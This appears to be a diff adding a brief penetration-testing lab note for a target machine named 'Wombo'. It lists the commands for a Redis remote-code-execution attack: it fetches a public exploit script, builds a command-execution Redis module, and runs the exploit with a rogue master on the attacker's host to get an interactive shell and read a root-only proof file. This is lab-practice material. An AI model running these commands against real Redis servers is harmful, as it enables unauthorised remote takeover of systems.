@@ -1,0 +1,13 @@
+192.168.159.69 Wombo
+
+
+Download https://github.com/Ridter/redis-rce/blob/master/redis-rce.py
+git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
+cd RedisModules-ExecuteCommand 
+make
+
+python3 redis-rce.py -f RedisModules-ExecuteCommand/module.so* -r 192.168.159.69 -p 6379 -L 192.168.45.173 -P 6379 -v
+got exploited 
+I select interactive Sheell
+ls /root
+cat /root/proof.txt
